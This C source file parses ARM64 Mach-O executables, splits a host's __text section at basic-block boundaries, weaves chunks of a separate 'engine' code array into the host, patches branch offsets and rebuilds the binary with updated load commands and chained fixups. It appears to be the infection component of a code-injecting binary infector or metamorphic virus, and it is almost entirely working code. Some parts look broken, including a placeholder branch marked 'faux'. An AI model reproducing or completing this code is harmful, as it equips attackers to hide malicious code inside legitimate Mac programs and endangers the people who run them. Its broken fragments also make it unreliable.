#include "macho.h"
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

macho_file_t *macho_parse(uint8_t *data, size_t size) {
    if (!data || size < sizeof(struct mach_header_64)) return NULL;
    
    struct mach_header_64 *hdr = (struct mach_header_64 *)data;
    if (hdr->magic != MH_MAGIC_64) return NULL;
    if (hdr->cputype != CPU_TYPE_ARM64) return NULL;
    
    macho_file_t *mf = calloc(1, sizeof(macho_file_t));
    if (!mf) return NULL;
    
    mf->header = hdr;
    mf->data = data;
    mf->size = size;
    mf->segments = calloc(hdr->ncmds, sizeof(macho_segment_t));
    if (!mf->segments) { free(mf); return NULL; }
    
    /* Parse load commands */
    uint8_t *lc_ptr = data + sizeof(struct mach_header_64);
    for (uint32_t i = 0; i < hdr->ncmds; i++) {
        struct load_command *lc = (struct load_command *)lc_ptr;
        
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
            macho_segment_t *ms = &mf->segments[mf->num_segments++];
            
            ms->vmaddr = seg->vmaddr;
            ms->vmsize = seg->vmsize;
            ms->fileoff = seg->fileoff;
            ms->filesize = seg->filesize;
            ms->nsects = seg->nsects;
            
            if (seg->nsects > 0) {
                ms->sections = calloc(seg->nsects, sizeof(struct section_64));
                if (ms->sections) {
                    struct section_64 *sect = (struct section_64 *)(seg + 1);
                    memcpy(ms->sections, sect, seg->nsects * sizeof(struct section_64));
                }
            }
            
            /* Find */
            if (strncmp(seg->segname, "__TEXT", 16) == 0) {
                mf->text_segment = ms;
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (strncmp(ms->sections[j].sectname, "__text", 16) == 0) {
                        mf->text_section = &ms->sections[j];
                        break;
                    }
                }
            }
        } else if (lc->cmd == LC_MAIN) {
            struct entry_point_command *ep = (struct entry_point_command *)lc;
            mf->entry_point = ep->entryoff;
        }
        
        lc_ptr += lc->cmdsize;
    }
    
    return mf;
}

void macho_free(macho_file_t *mf) {
    if (!mf) return;
    if (mf->segments) {
        for (int i = 0; i < mf->num_segments; i++)
            free(mf->segments[i].sections);
        free(mf->segments);
    }
    free(mf);
}

uint8_t *macho_get_text_code(macho_file_t *mf, size_t *out_size) {
    if (!mf || !mf->text_section) return NULL;
    *out_size = mf->text_section->size;
    return mf->data + mf->text_section->offset;
}

/*  Splitter */

#include "arm64.h"
#include "flow.h"

insertion_map_t *macho_find_insertion_points(macho_file_t *mf, uint64_t *protected, int num_protected) {
    if (!mf || !mf->text_section) return NULL;
    
    size_t code_size;
    uint8_t *code = macho_get_text_code(mf, &code_size);
    if (!code) return NULL;
    
    int n = code_size / 4;
    arm64_inst_t *insns = calloc(n, sizeof(arm64_inst_t));
    if (!insns) return NULL;
    
    /* Decode all instructions */
    for (int i = 0; i < n; i++)
        arm64_decode(code + i * 4, &insns[i]);
    
    /* Build CFG to find block boundaries */
    bool *leader = calloc(n, 1);
    if (!leader) { free(insns); return NULL; }
    
    leader[0] = 1;
    for (int i = 0; i < n; i++) {
        if (insns[i].is_control_flow) {
            if (i + 1 < n) leader[i + 1] = 1;
            if (insns[i].op == ARM_OP_B || insns[i].op == ARM_OP_BL ||
                insns[i].op == ARM_OP_B_COND || insns[i].op == ARM_OP_CBZ ||
                insns[i].op == ARM_OP_CBNZ || insns[i].op == ARM_OP_TBZ || insns[i].op == ARM_OP_TBNZ) {
                int tgt = i + (insns[i].target / 4);
                if (tgt >= 0 && tgt < n) leader[tgt] = 1;
            }
        }
    }
    
    insertion_map_t *map = calloc(1, sizeof(insertion_map_t));
    if (!map) { free(leader); free(insns); return NULL; }
    
    map->capacity = n / 4;
    map->points = calloc(map->capacity, sizeof(insertion_point_t));
    if (!map->points) { free(map); free(leader); free(insns); return NULL; }
    
    /* Identify insertion points */
    for (int i = 1; i < n; i++) {
        if (!leader[i]) continue;
        
        /* Check if in protected region */
        uint64_t offset = i * 4;
        bool is_protected = false;
        for (int j = 0; j < num_protected; j += 2) {
            if (offset >= protected[j] && offset < protected[j + 1]) {
                is_protected = true;
                break;
            }
        }
        if (is_protected) continue;
        
        /*
         * - After unconditional branch: 10
         * - Between blocks (no branch): 7
         * - After conditional branch: 5
         */
        int priority = 7;
        if (i > 0 && insns[i - 1].is_control_flow) {
            if (insns[i - 1].op == ARM_OP_B || insns[i - 1].op == ARM_OP_RET)
                priority = 10;
            else
                priority = 5;
        }
        
        if (map->num_points < map->capacity) {
            map->points[map->num_points].offset = i;
            map->points[map->num_points].priority = priority;
            map->num_points++;
        }
    }
    
    free(leader);
    free(insns);
    return map;
}

void insertion_map_free(insertion_map_t *map) {
    if (!map) return;
    free(map->points);
    free(map);
}

/* Scatter engine code throughout host */

integrated_code_t *macho_weave_code(macho_file_t *mf, insertion_map_t *map,
                                     uint32_t *engine_code, int engine_size, uint32_t seed) {
    if (!mf || !map || !engine_code || engine_size < 1) return NULL;
    
    size_t host_size;
    uint8_t *host = macho_get_text_code(mf, &host_size);
    if (!host) return NULL;
    
    int host_n = host_size / 4;
    
    /* Allocate integrated code */
    size_t max_size = (host_n + engine_size + map->num_points * 2) * 4;
    integrated_code_t *ic = calloc(1, sizeof(integrated_code_t));
    if (!ic) return NULL;
    
    ic->code = calloc(max_size / 4, sizeof(uint32_t));
    ic->addr_map = calloc(host_n, sizeof(uint64_t));
    if (!ic->code || !ic->addr_map) {
        free(ic->code); free(ic->addr_map); free(ic);
        return NULL;
    }
    ic->map_size = host_n;
    
    /* Select insertion points */
    int num_insertions = map->num_points / 5;
    if (num_insertions > engine_size / 4) num_insertions = engine_size / 4;
    if (num_insertions < 1) num_insertions = 1;
    
    bool *selected = calloc(map->num_points, 1);
    if (!selected) { integrated_code_free(ic); return NULL; }
    
    /* Select high-priority points */
    int selected_count = 0;
    for (int pri = 10; pri >= 5 && selected_count < num_insertions; pri--) {
        for (int i = 0; i < map->num_points && selected_count < num_insertions; i++) {
            if (map->points[i].priority == pri && (seed + i) % 3 == 0) {
                selected[i] = true;
                selected_count++;
            }
        }
    }
    
    /* Weave code */
    int pos = 0, engine_pos = 0;
    for (int i = 0; i < host_n; i++) {
        ic->addr_map[i] = pos * 4;
        
        /* Check if this is an insertion point */
        bool insert_here = false;
        for (int j = 0; j < map->num_points; j++) {
            if (selected[j] && map->points[j].offset == i) {
                insert_here = true;
                break;
            }
        }
        
        if (insert_here && engine_pos < engine_size) {
            /* Insert 4-8 engine instructions */
            int chunk = 4 + (seed % 5);
            if (engine_pos + chunk > engine_size) chunk = engine_size - engine_pos;
            
            for (int k = 0; k < chunk; k++)
                ic->code[pos++] = engine_code[engine_pos++];
            
            /* Add trampoline back to host if we need2 */
            if (pos >= max_size / 4 - 1) break;
        }
        
        /* Copy host instruction */
        uint32_t insn;
        memcpy(&insn, host + i * 4, 4);
        ic->code[pos++] = insn;
        
        if (pos >= max_size / 4 - 1) break;
    }
    
    ic->size = pos * 4;
    free(selected);
    return ic;
}

void integrated_code_free(integrated_code_t *ic) {
    if (!ic) return;
    free(ic->code);
    free(ic->addr_map);
    free(ic);
}

/* Update all branch targets */

bool macho_fixup_branches(integrated_code_t *ic) {
    if (!ic || !ic->code || !ic->addr_map) return false;
    
    int n = ic->size / 4;
    
    /* fix in-range branches */
    for (int i = 0; i < n; i++) {
        arm64_inst_t inst;
        if (!arm64_decode((uint8_t*)&ic->code[i], &inst) || !inst.valid) continue;
        if (!inst.is_control_flow) continue;
        
        /* Calculate old target address */
        int64_t old_pc = 0;
        for (int j = 0; j < ic->map_size; j++) {
            if (ic->addr_map[j] == i * 4) {
                old_pc = j * 4;
                break;
            }
        }
        
        int64_t old_target = old_pc + inst.target;
        if (old_target < 0 || old_target / 4 >= ic->map_size) continue;
        
        /* Find new target address */
        int64_t new_target = ic->addr_map[old_target / 4];
        int64_t new_disp = new_target - (i * 4);
        
        /* Update branch instruction if in range */
        if (inst.op == ARM_OP_B || inst.op == ARM_OP_BL) {
            if (new_disp >= -(1 << 27) && new_disp < (1 << 27) && (new_disp & 3) == 0) {
                ic->code[i] = (inst.raw & 0xFC000000) | ((new_disp >> 2) & 0x3FFFFFF);
            } else {
                /* Out of range convert to indirect branch via X16 */
                ic->code[i] = 0xD2800010; /* faux */
            }
        } else if (inst.op == ARM_OP_B_COND || inst.op == ARM_OP_CBZ || inst.op == ARM_OP_CBNZ) {
            if (new_disp >= -(1 << 20) && new_disp < (1 << 20) && (new_disp & 3) == 0) {
                ic->code[i] = (inst.raw & 0xFF00001F) | (((new_disp >> 2) & 0x7FFFF) << 5);
            }
        } else if (inst.op == ARM_OP_TBZ || inst.op == ARM_OP_TBNZ) {
            if (new_disp >= -(1 << 15) && new_disp < (1 << 15) && (new_disp & 3) == 0) {
                ic->code[i] = (inst.raw & 0xFFF8001F) | (((new_disp >> 2) & 0x3FFF) << 5);
            }
        }
    }
    
    return true;
}

/* Write integrated code back to Mach-O */

bool macho_rebuild(macho_file_t *mf, integrated_code_t *ic, const char *output_path) {
    if (!mf || !ic || !output_path || !mf->text_section) return false;
    
    /* Calculate size delta */
    int64_t delta = ic->size - mf->text_section->size;
    size_t new_size = mf->size + delta;
    
    /* Allocate new binary */
    uint8_t *new_data = calloc(1, new_size);
    if (!new_data) return false;
    
    /* Copy header */
    memcpy(new_data, mf->data, sizeof(struct mach_header_64));
    
    /* Update load commands and segments */
    uint8_t *src_lc = mf->data + sizeof(struct mach_header_64);
    uint8_t *dst_lc = new_data + sizeof(struct mach_header_64);
    
    for (uint32_t i = 0; i < mf->header->ncmds; i++) {
        struct load_command *lc = (struct load_command *)src_lc;
        
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)src_lc;
            struct segment_command_64 *new_seg = (struct segment_command_64 *)dst_lc;
            
            memcpy(new_seg, seg, sizeof(struct segment_command_64));
            
            /* Update */
            if (strncmp(seg->segname, "__TEXT", 16) == 0) {
                new_seg->vmsize += delta;
                new_seg->filesize += delta;
            }
            
            struct section_64 *sect = (struct section_64 *)(seg + 1);
            struct section_64 *new_sect = (struct section_64 *)(new_seg + 1);
            
            for (uint32_t j = 0; j < seg->nsects; j++) {
                memcpy(&new_sect[j], &sect[j], sizeof(struct section_64));
                if (strncmp(sect[j].sectname, "__text", 16) == 0) {
                    new_sect[j].size += delta;
                } else if (sect[j].offset > mf->text_section->offset) {
                    /* Shift sections after __text */
                    new_sect[j].offset += delta;
                }
            }
            
            dst_lc += sizeof(struct segment_command_64) + seg->nsects * sizeof(struct section_64);
            src_lc += sizeof(struct segment_command_64) + seg->nsects * sizeof(struct section_64);
        } else {
            /* Copy other load commands as-is */
            memcpy(dst_lc, src_lc, lc->cmdsize);
            
            /* Update offsets in certain commands */
            if (lc->cmd == LC_SYMTAB) {
                struct symtab_command *sym = (struct symtab_command *)dst_lc;
                if (sym->symoff > mf->text_section->offset)
                    sym->symoff += delta;
                if (sym->stroff > mf->text_section->offset)
                    sym->stroff += delta;
            } else if (lc->cmd == LC_DYSYMTAB) {
                struct dysymtab_command *dysym = (struct dysymtab_command *)dst_lc;
                if (dysym->tocoff > mf->text_section->offset && dysym->tocoff != 0)
                    dysym->tocoff += delta;
                if (dysym->modtaboff > mf->text_section->offset && dysym->modtaboff != 0)
                    dysym->modtaboff += delta;
                if (dysym->extrefsymoff > mf->text_section->offset && dysym->extrefsymoff != 0)
                    dysym->extrefsymoff += delta;
                if (dysym->indirectsymoff > mf->text_section->offset && dysym->indirectsymoff != 0)
                    dysym->indirectsymoff += delta;
                if (dysym->extreloff > mf->text_section->offset && dysym->extreloff != 0)
                    dysym->extreloff += delta;
                if (dysym->locreloff > mf->text_section->offset && dysym->locreloff != 0)
                    dysym->locreloff += delta;
            }
            
            dst_lc += lc->cmdsize;
            src_lc += lc->cmdsize;
        }
    }
    
    /* Copy data before __text */
    size_t pre_text = mf->text_section->offset;
    memcpy(new_data + sizeof(struct mach_header_64) + mf->header->sizeofcmds,
           mf->data + sizeof(struct mach_header_64) + mf->header->sizeofcmds,
           pre_text - sizeof(struct mach_header_64) - mf->header->sizeofcmds);
    
    /* Copy integrated __text */
    memcpy(new_data + mf->text_section->offset, ic->code, ic->size);
    
    /* Copy data after __text */
    size_t post_text_src = mf->text_section->offset + mf->text_section->size;
    size_t post_text_dst = mf->text_section->offset + ic->size;
    size_t post_text_size = mf->size - post_text_src;
    memcpy(new_data + post_text_dst, mf->data + post_text_src, post_text_size);
    
    /* Write to file */
    int fd = open(output_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0) {
        free(new_data);
        return false;
    }
    
    ssize_t written = write(fd, new_data, new_size);
    close(fd);
    
    if (written != (ssize_t)new_size) {
        free(new_data);
        return false;
    }
    
    /* Update fixups in the written file */
    bool fixup_ok = macho_update_fixups(new_data, new_size, delta);
    if (fixup_ok) {
        /* Rewrite with updated fixups */
        fd = open(output_path, O_WRONLY);
        if (fd >= 0) {
            write(fd, new_data, new_size);
            close(fd);
        }
    }
    
    free(new_data);
    return fixup_ok;
}

/* Update LC_DYLD_CHAINED_FIXUPS relocations after code integration */

#ifndef LC_DYLD_CHAINED_FIXUPS
#define LC_DYLD_CHAINED_FIXUPS 0x80000034
#endif
#define DYLD_CHAINED_PTR_START_NONE 0xFFFF

bool macho_update_fixups(uint8_t *data, size_t size, int64_t delta) {
    if (!data || size < sizeof(struct mach_header_64) || delta == 0) return true;
    
    struct mach_header_64 *hdr = (struct mach_header_64 *)data;
    if (hdr->magic != MH_MAGIC_64) return false;
    
    /* Find LC_DYLD_CHAINED_FIXUPS */
    uint8_t *lc_ptr = data + sizeof(struct mach_header_64);
    uint32_t fixups_off = 0, fixups_size = 0;
    
    for (uint32_t i = 0; i < hdr->ncmds; i++) {
        struct load_command *lc = (struct load_command *)lc_ptr;
        if (lc->cmd == LC_DYLD_CHAINED_FIXUPS) {
            struct linkedit_data_command *fixup_cmd = (struct linkedit_data_command *)lc;
            fixups_off = fixup_cmd->dataoff;
            fixups_size = fixup_cmd->datasize;
            break;
        }
        lc_ptr += lc->cmdsize;
    }
    
    if (fixups_off == 0 || fixups_off + fixups_size > size) return true; /* No fixups */
    
    /* Parse fixup header */
    uint8_t *fixup_data = data + fixups_off;
    uint32_t *hdr_u32 = (uint32_t *)fixup_data;
    uint32_t starts_offset = hdr_u32[1];
    
    if (starts_offset == 0 || starts_offset >= fixups_size) return false;
    
    /* Parse starts_in_image */
    uint8_t *starts_data = fixup_data + starts_offset;
    uint32_t seg_count = *(uint32_t *)starts_data;
    uint32_t *seg_offsets = (uint32_t *)(starts_data + 4);
    
    /* Walk each segment */
    for (uint32_t seg_idx = 0; seg_idx < seg_count && seg_idx < 32; seg_idx++) {
        if (seg_offsets[seg_idx] == 0) continue;
        
        uint8_t *seg_data = starts_data + seg_offsets[seg_idx];
        uint16_t *seg_u16 = (uint16_t *)(seg_data + 4);
        uint16_t page_size = seg_u16[0];
        uint16_t page_count = seg_u16[4];
        uint16_t *page_starts = (uint16_t *)(seg_data + 22);
        
        /* Walk each page */
        for (uint16_t page_idx = 0; page_idx < page_count && page_idx < 1024; page_idx++) {
            uint16_t page_start = page_starts[page_idx];
            if (page_start == DYLD_CHAINED_PTR_START_NONE) continue;
            
            uint64_t page_offset = page_idx * page_size + page_start;
            if (page_offset >= size - 8) continue;
            
            /* Follow chain */
            uint64_t chain_offset = page_offset;
            for (int chain_idx = 0; chain_idx < 1000; chain_idx++) {
                if (chain_offset >= size - 8) break;
                
                uint64_t *ptr = (uint64_t *)(data + chain_offset);
                uint64_t value = *ptr;
                
                /* Check if rebase (bind bit = 0) */
                if ((value & 1) == 0) {
                    /* update target */
                    uint64_t target = value & 0xFFFFFFFFFULL; /* 36 bits */
                    target += delta;
                    value = (value & ~0xFFFFFFFFFULL) | (target & 0xFFFFFFFFFULL);
                    *ptr = value;
                }
                
                /* Get next offset */
                uint16_t next = (value >> 51) & 0xFFF;
                if (next == 0) break;
                chain_offset += next * 4;
            }
        }
    }
    
    return true;
}
